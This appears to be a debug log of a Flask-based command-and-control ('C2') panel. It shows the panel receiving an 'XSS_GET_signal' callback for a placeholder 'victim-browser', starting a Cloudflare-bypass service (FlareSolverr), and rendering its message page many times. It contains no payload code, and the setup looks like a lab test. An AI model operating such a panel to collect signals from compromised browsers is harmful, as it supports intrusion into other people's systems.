2025-06-24 17:12:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:12:00] "[33mGET /add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1[0m" 404 -
2025-06-24 17:12:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 17:12:00 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-24 17:12:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0044s) -> 回傳: (<Response 216 bytes [200 OK]>, 200)
2025-06-24 17:12:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:12:00] "GET /api/control/add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1" 200 -
2025-06-24 17:12:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 17:12:14 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 17:12:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0009s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <h2>控制消息</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n    <form method="post" action="/api/control/add_message">\n        <div class="form-group">\n            <label class="form-label" for="message">控制消息</label>\n            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n        </div>\n        <div class="form-group">\n            <label class="form-label" for="target_ip">目標IP地址</label>\n            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n        </div>\n        <button type="submit">發送消息</button>\n    </form>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 17:12:00.704629</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 17:12:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:12:14] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 17:12:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:12:14] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 17:12:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:12:14] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:18:51 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:18:51 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 17:18:51 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:18:51 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 17:18:51 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:18:51 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 17:18:51 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:18:51 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 17:18:51 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 17:18:55 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 17:18:55 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 17:18:55 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:18:55 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 17:18:55 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-24 17:18:55 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-24 17:23:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 17:23:21 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 17:23:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0262s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <h2>控制消息</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n    <form method="post" action="/api/control/add_message">\n        <div class="form-group">\n            <label class="form-label" for="message">控制消息</label>\n            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n        </div>\n        <div class="form-group">\n            <label class="form-label" for="target_ip">目標IP地址</label>\n            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n        </div>\n        <button type="submit">發送消息</button>\n    </form>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 17:12:00.704629</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 17:23:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:21] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 17:23:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:21] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 17:23:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:21] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:23:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 17:23:23 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 17:23:23 | ERROR    | control_route.py:96 | help_page() | 找不到幫助配置文件: config/control_help.json
2025-06-24 17:23:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0002s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 17:23:23 | WARNING  | file.py:272 | set() | Exception raised while handling cache file '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/018699300c392d704da618dca6030d8c'
Traceback (most recent call last):
  File "/home/hacker/Desktop/share/C2/venv/lib/python3.12/site-packages/cachelib/file.py", line 260, in set
    fd, tmp = tempfile.mkstemp(
              ^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 496, in mkstemp
    return _mkstemp_inner(dir, prefix, suffix, flags, output_type)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 395, in _mkstemp_inner
    fd = _os.open(file, flags, 0o600)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/tmperw_9gp_.__wz_cache'
2025-06-24 17:23:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:23] "[32mGET /api/control/help HTTP/1.1[0m" 302 -
2025-06-24 17:23:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 17:23:23 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 17:23:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0007s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <h2>控制消息</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n    <form method="post" action="/api/control/add_message">\n        <div class="form-group">\n            <label class="form-label" for="message">控制消息</label>\n            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n        </div>\n        <div class="form-group">\n            <label class="form-label" for="target_ip">目標IP地址</label>\n            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n        </div>\n        <button type="submit">發送消息</button>\n    </form>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 17:12:00.704629</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 17:23:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:23] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 17:23:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:23] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 17:23:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:23] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:23:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 17:23:26 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 17:23:26 | ERROR    | control_route.py:96 | help_page() | 找不到幫助配置文件: config/control_help.json
2025-06-24 17:23:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0001s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 17:23:26 | WARNING  | file.py:272 | set() | Exception raised while handling cache file '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/e6da6be8f578ef0c575873756093839f'
Traceback (most recent call last):
  File "/home/hacker/Desktop/share/C2/venv/lib/python3.12/site-packages/cachelib/file.py", line 260, in set
    fd, tmp = tempfile.mkstemp(
              ^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 496, in mkstemp
    return _mkstemp_inner(dir, prefix, suffix, flags, output_type)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 395, in _mkstemp_inner
    fd = _os.open(file, flags, 0o600)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/tmpp2mt8wh1.__wz_cache'
2025-06-24 17:23:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:26] "[32mGET /api/control/help HTTP/1.1[0m" 302 -
2025-06-24 17:23:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 17:23:26 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 17:23:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0005s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <h2>控制消息</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n    <form method="post" action="/api/control/add_message">\n        <div class="form-group">\n            <label class="form-label" for="message">控制消息</label>\n            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n        </div>\n        <div class="form-group">\n            <label class="form-label" for="target_ip">目標IP地址</label>\n            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n        </div>\n        <button type="submit">發送消息</button>\n    </form>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 17:12:00.704629</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 17:23:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:26] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 17:23:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:26] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 17:23:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:26] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:23:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 17:23:28 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 17:23:28 | ERROR    | control_route.py:96 | help_page() | 找不到幫助配置文件: config/control_help.json
2025-06-24 17:23:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0001s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 17:23:28 | WARNING  | file.py:272 | set() | Exception raised while handling cache file '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/9c3da56c2d04166b2176bfe94ef30107'
Traceback (most recent call last):
  File "/home/hacker/Desktop/share/C2/venv/lib/python3.12/site-packages/cachelib/file.py", line 260, in set
    fd, tmp = tempfile.mkstemp(
              ^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 496, in mkstemp
    return _mkstemp_inner(dir, prefix, suffix, flags, output_type)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 395, in _mkstemp_inner
    fd = _os.open(file, flags, 0o600)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/tmpft606_29.__wz_cache'
2025-06-24 17:23:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:28] "[32mGET /api/control/help HTTP/1.1[0m" 302 -
2025-06-24 17:23:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 17:23:28 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 17:23:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0005s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <h2>控制消息</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n    <form method="post" action="/api/control/add_message">\n        <div class="form-group">\n            <label class="form-label" for="message">控制消息</label>\n            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n        </div>\n        <div class="form-group">\n            <label class="form-label" for="target_ip">目標IP地址</label>\n            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n        </div>\n        <button type="submit">發送消息</button>\n    </form>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 17:12:00.704629</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 17:23:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:28] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 17:23:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:28] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 17:23:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:28] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 17:23:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-24 17:23:48 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-24 17:23:48 | ERROR    | control_route.py:96 | help_page() | 找不到幫助配置文件: config/control_help.json
2025-06-24 17:23:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0001s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 17:23:48 | WARNING  | file.py:272 | set() | Exception raised while handling cache file '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/efe04610877ddfda1e5bd49f72a03f0f'
Traceback (most recent call last):
  File "/home/hacker/Desktop/share/C2/venv/lib/python3.12/site-packages/cachelib/file.py", line 260, in set
    fd, tmp = tempfile.mkstemp(
              ^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 496, in mkstemp
    return _mkstemp_inner(dir, prefix, suffix, flags, output_type)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 395, in _mkstemp_inner
    fd = _os.open(file, flags, 0o600)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/tmp6wspc87g.__wz_cache'
2025-06-24 17:23:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 17:23:48] "[32mGET /api/control/help HTTP/1.1[0m" 302 -
2025-06-24 17:23:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 17:23:48 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 17:23:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0005s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <h2>控制消息</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n    <form method="post" action="/api/control/add_message">\n        <div class="form-group">\n            <label class="form-label" for="message">控制消息</label>\n            <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n        </div>\n        <div class="form-group">\n            <label class="form-label" for="target_ip">目標IP地址</label>\n            <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n        </div>\n        <button type="submit">發送消息</button>\n    </form>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" 